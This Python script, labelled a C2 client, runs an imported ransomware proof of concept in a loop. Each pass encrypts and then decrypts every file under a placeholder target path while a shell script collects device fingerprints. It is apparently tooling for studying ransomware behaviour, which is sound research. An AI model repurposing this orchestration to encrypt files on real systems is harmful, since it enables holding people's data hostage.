from argparse import ArgumentParser
from multiprocessing import Process, Queue
from subprocess import Popen
import os
import signal

from rwpoc import run
from config_changes import listen_for_config_changes

TARGET_PATH = "<start-path-on-target-device>"


def parse_args():
    parser = ArgumentParser(description='C2 Client')
    parser.add_argument('-n', '--number',
                        help='Number of fingerprints to collect in one encryption run.',
                        default=0,
                        action="store")

    return parser.parse_args()


def collect_device_fingerprint(limit, pid_queue):
    if limit > 0:
        """
        Remember: once the limit is reached the subprocess is terminated.
        However, the (parent) encryption process is still running to completion
        and will re-trigger the FP collection on the next iteration - up to the limit.
        """
        p = Popen(["./fingerprinter.sh", "-n {}".format(limit)])
    else:
        p = Popen("./fingerprinter.sh")
    pid_queue.put(p.pid)


def kill_process(proc):
    print("kill Process", proc)
    proc.terminate()
    proc.join()


def kill_child_processes(pid_queue):
    while not pid_queue.empty():
        pid = pid_queue.get()
        print("kill child process with pid {}".format(pid))
        os.kill(pid, signal.SIGKILL)


if __name__ == "__main__":
    # Parse arguments
    args = parse_args()
    num_fp = int(args.number)

    # Start subprocess to integrate config changes
    procs = []
    child_pids = Queue()
    proc_config = Process(target=listen_for_config_changes)
    procs.append(proc_config)
    proc_config.start()

    try:
        abs_paths = TARGET_PATH

        while True:
            # input("\nEnter: start encrypting")

            proc_fp = Process(target=collect_device_fingerprint, args=(num_fp, child_pids))
            proc_fp.start()
            procs.append(proc_fp)

            # input("\nwait shortly for child to start")
            print("\nENCRYPT")

            run(encrypt=True, absolute_paths=abs_paths)  # encrypt
            kill_child_processes(child_pids)
            kill_process(proc_fp)
            procs.remove(proc_fp)

            # input("\nEnter: start decrypting")
            print("\nDECRYPT")

            run(encrypt=False, absolute_paths=abs_paths)  # decrypt
    finally:
        print("finally")
        for proc in procs:
            if proc.is_alive():
                kill_process(proc)
            else:
                print("Process", proc, "already dead.")
        kill_child_processes(child_pids)
